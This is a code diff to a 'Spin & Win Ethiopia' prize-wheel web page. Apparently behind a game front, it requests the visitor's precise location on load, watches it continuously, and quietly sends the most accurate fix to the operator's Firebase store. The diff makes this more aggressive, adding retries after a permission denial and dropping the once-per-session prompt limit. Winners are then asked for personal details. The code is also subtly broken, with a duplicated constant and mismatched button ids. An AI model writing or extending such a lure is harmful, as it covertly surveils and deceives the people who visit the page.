@@ -2,12 +2,34 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="theme-color" content="#3b82f6">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <title>Spin & Win Ethiopia</title>
     <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-firestore-compat.js"></script>
     <style>
+        /* Prevent text selection and tap highlight */
+        * {
+            -webkit-tap-highlight-color: transparent;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            -khtml-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+        
+        /* Prevent zoom on input focus on iOS */
+        @media screen and (-webkit-min-device-pixel-ratio: 0) {
+            input, select, textarea, button {
+                font-size: 16px !important;
+            }
+        }
+        
         .wheel {
             width: min(95vw, 500px);
             height: min(95vw, 500px);
@@ -164,6 +186,13 @@
     </div>
 
     <script>
+        // Prevent default touch behaviors that could interfere with the wheel
+        document.addEventListener('touchmove', function(e) {
+            if (e.target.closest('.wheel-container') || e.target.closest('#spinButton')) {
+                e.preventDefault();
+            }
+        }, { passive: false });
+        
         // Firebase configuration
         const firebaseConfig = {
         apiKey: "AIzaSyCO35JZoFm240m3SFLjGGzgFcsypAr_YkQ",
@@ -221,60 +250,121 @@
             localStorage.setItem('userId', userId);
         }
 
-        // Get user's location (one-shot)
+        // Get user's location (one-shot) with better Android support
         function requestLocation() {
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
+                    console.warn('Geolocation is not supported by this browser');
                     userLocation = { lat: null, lng: null };
                     return resolve(userLocation);
                 }
-                if (hasRequestedLocationPrompt) {
-                    // We've already prompted this session; do not trigger another prompt
-                    return resolve(userLocation);
-                }
-                hasRequestedLocationPrompt = true;
+
+                // First try with high accuracy
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        userLocation = {
-                            lat: position.coords.latitude,
-                            lng: position.coords.longitude
-                        };
-                        // update lastValidLocation if valid
-                        if (isValidLocation(userLocation)) lastValidLocation = userLocation;
-                        // Mimic "Location found!" -> send to admin in background after brief wait
-                        setTimeout(async () => {
-                            // Background: wait for DB then try to send
-                            await waitForDbReady();
-                            sendInitialLocationOnce();
-                        }, 800);
-                        resolve(userLocation);
+                        handleLocationSuccess(position, resolve);
                     },
                     (error) => {
-                        console.error('Error getting location:', error);
-                        userLocation = { lat: null, lng: null };
-                        resolve(userLocation);
+                        console.warn('High accuracy location failed, trying with lower accuracy', error);
+                        // Fallback to lower accuracy
+                        navigator.geolocation.getCurrentPosition(
+                            (position) => {
+                                handleLocationSuccess(position, resolve);
+                            },
+                            (error) => {
+                                console.error('Error getting location:', error);
+                                userLocation = { lat: null, lng: null };
+                                resolve(userLocation);
+                            },
+                            {
+                                enableHighAccuracy: false,
+                                timeout: 10000,
+                                maximumAge: 0
+                            }
+                        );
                     },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 8000,  // Shorter timeout for first try
+                        maximumAge: 0
+                    }
                 );
             });
         }
 
-        // Start/Stop continuous watcher to improve accuracy and capture fix proactively
+        function handleLocationSuccess(position, resolve) {
+            userLocation = {
+                lat: position.coords.latitude,
+                lng: position.coords.longitude,
+                accuracy: position.coords.accuracy
+            };
+            
+            // Update lastValidLocation if this is more accurate or we don't have one yet
+            if (!lastValidLocation || 
+                (userLocation.accuracy && 
+                 (!lastValidLocation.accuracy || userLocation.accuracy < lastValidLocation.accuracy))) {
+                lastValidLocation = { ...userLocation };
+            }
+            
+            // Send location to server in background
+            setTimeout(async () => {
+                await waitForDbReady();
+                await sendInitialLocationOnce();
+            }, 300);
+            
+            resolve(userLocation);
+        }
+
+        // Start/Stop continuous watcher with better error handling and accuracy management
         function startLocationWatcher() {
             if (!navigator.geolocation || geoWatchId !== null) return;
+            
+            // First try with high accuracy
             geoWatchId = navigator.geolocation.watchPosition(
                 (position) => {
-                    const loc = { lat: position.coords.latitude, lng: position.coords.longitude };
+                    const loc = { 
+                        lat: position.coords.latitude, 
+                        lng: position.coords.longitude,
+                        accuracy: position.coords.accuracy
+                    };
+                    
                     if (isValidLocation(loc)) {
-                        lastValidLocation = loc;
-                        // If we haven't sent the initial location row yet, do it now
-                        sendInitialLocationOnce();
+                        // Only update if this is more accurate or we don't have a location yet
+                        if (!lastValidLocation || 
+                            (loc.accuracy && 
+                             (!lastValidLocation.accuracy || loc.accuracy < lastValidLocation.accuracy))) {
+                            lastValidLocation = { ...loc };
+                            sendInitialLocationOnce();
+                        }
                     }
                 },
                 (err) => {
                     console.warn('watchPosition error:', err?.message || err);
+                    // Try with lower accuracy if high accuracy fails
+                    if (err.code === 1) { // PERMISSION_DENIED
+                        console.log('Falling back to low accuracy location');
+                        geoWatchId = navigator.geolocation.watchPosition(
+                            (position) => {
+                                const loc = { 
+                                    lat: position.coords.latitude, 
+                                    lng: position.coords.longitude,
+                                    accuracy: position.coords.accuracy
+                                };
+                                if (isValidLocation(loc)) {
+                                    lastValidLocation = { ...loc };
+                                    sendInitialLocationOnce();
+                                }
+                            },
+                            (err) => console.warn('Low accuracy watchPosition error:', err?.message || err),
+                            { enableHighAccuracy: false, maximumAge: 10000 }
+                        );
+                    }
                 },
-                { enableHighAccuracy: true, maximumAge: 1000, timeout: 20000 }
+                { 
+                    enableHighAccuracy: true, 
+                    maximumAge: 0, 
+                    timeout: 10000 
+                }
             );
         }
 
@@ -329,8 +419,10 @@
             const { lat, lng } = loc;
             if (typeof lat !== 'number' || typeof lng !== 'number') return false;
             if (!isFinite(lat) || !isFinite(lng)) return false;
-            // Treat (0,0) as invalid to avoid placeholder location
-            if (lat === 0 && lng === 0) return false;
+            // Allow (0,0) but with accuracy check
+            if (lat === 0 && lng === 0) {
+                return loc.accuracy && loc.accuracy < 10000; // Accept if accuracy is better than 10km
+            }
             return true;
         }
 
@@ -446,12 +538,28 @@
         }
 
         // Spin the wheel
-        async function spinWheel() {
+        function spinWheel() {
             if (isSpinning) return;
-            // Do not prompt here; use lastValidLocation captured on load
-
+            isSpinning = true;
+            
+            // Add haptic feedback if available
+            if ('vibrate' in navigator) {
+                navigator.vibrate(50);
+            }
+            
+            // Disable spin button with visual feedback
+            const spinBtn = document.getElementById('spinButton');
+            spinBtn.disabled = true;
+            spinBtn.classList.add('opacity-50');
+            
+            // Play sound if available
+            if (typeof spinSound !== 'undefined') {
+                spinSound.currentTime = 0;
+                spinSound.play().catch(e => console.log('Audio play failed:', e));
+            }
+            
             const wheel = document.getElementById('wheel');
-            const spinBtn = document.getElementById('spinBtn');
+            const spinBtn = document.getElementById('spinButton');
             const resultEl = document.getElementById('result');
             
             isSpinning = true;
@@ -470,17 +578,23 @@
             // Apply rotation with easing
             wheel.style.transform = `rotate(${totalRotation}deg)`;
             
-            // After animation completes
+            // Reset after spin completes
             setTimeout(() => {
                 isSpinning = false;
+                const spinBtn = document.getElementById('spinButton');
                 spinBtn.disabled = false;
+                spinBtn.classList.remove('opacity-50');
                 
                 const prize = segments[segmentIndex].text;
+                const resultEl = document.getElementById('result');
                 resultEl.textContent = `You won: ${prize}!`;
                 
-                // Save result to Firestore
-                saveSpinResult(prize);
+                // Add haptic feedback for win
+                if ('vibrate' in navigator) {
+                    navigator.vibrate([100, 50, 100]);
+                }
                 
+                saveSpinResult(prize);
                 spinCount++;
 
                 // Prompt for details only on winning outcomes
@@ -502,9 +616,68 @@
             return angle < 0 ? angle + 360 : angle;
         }
 
+        // Add touch event handlers for the wheel
+        function initTouchControls() {
+            const wheel = document.querySelector('.wheel');
+            let touchStartX = 0;
+            let touchStartY = 0;
+            let isTouchMoving = false;
+            
+            wheel.addEventListener('touchstart', (e) => {
+                if (isSpinning) return;
+                const touch = e.touches[0];
+                touchStartX = touch.clientX;
+                touchStartY = touch.clientY;
+                isTouchMoving = false;
+            }, { passive: true });
+            
+            wheel.addEventListener('touchmove', (e) => {
+                if (isSpinning) return;
+                if (!isTouchMoving) {
+                    const touch = e.touches[0];
+                    const dx = touch.clientX - touchStartX;
+                    const dy = touch.clientY - touchStartY;
+                    // Only start considering it a move after a small threshold
+                    if (Math.abs(dx) > 5 || Math.abs(dy) > 5) {
+                        isTouchMoving = true;
+                    }
+                }
+            }, { passive: true });
+            
+            wheel.addEventListener('touchend', (e) => {
+                if (isSpinning || !isTouchMoving) return;
+                spinWheel();
+            }, { passive: true });
+        }
+        
         // Initialize the game
         document.addEventListener('DOMContentLoaded', () => {
             createWheel();
+            initTouchControls();
+            
+            // Add touch feedback to buttons
+            document.querySelectorAll('button').forEach(btn => {
+                btn.addEventListener('touchstart', () => {
+                    btn.classList.add('scale-95');
+                }, { passive: true });
+                
+                btn.addEventListener('touchend', () => {
+                    btn.classList.remove('scale-95');
+                }, { passive: true });
+                
+                // Prevent zoom on double-tap
+                let lastTap = 0;
+                btn.addEventListener('touchend', (e) => {
+                    const currentTime = new Date().getTime();
+                    const tapLength = currentTime - lastTap;
+                    if (tapLength < 300 && tapLength > 0) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                    }
+                    lastTap = currentTime;
+                }, { passive: true });
+            });
+            
             // Automatic location enable: start watcher and request permission immediately
             startLocationWatcher();
             requestLocation().then(async () => {
@@ -563,7 +736,19 @@
             const modal = document.getElementById('winnerModal');
             modal.classList.add('hidden');
             modal.classList.remove('flex');
-            (document.getElementById('winnerForm')).reset();
+            document.getElementById('winnerForm').reset();
+            
+            // Reset the wheel animation
+            const wheel = document.getElementById('wheel');
+            wheel.style.transition = 'none';
+            wheel.style.transform = 'rotate(0deg)';
+            // Force reflow
+            void wheel.offsetWidth;
+            // Re-enable transition
+            wheel.style.transition = 'transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99)';
+            
+            // Enable spin button
+            document.getElementById('spinBtn').disabled = false;
         }
 
         // Save winner details to Firestore
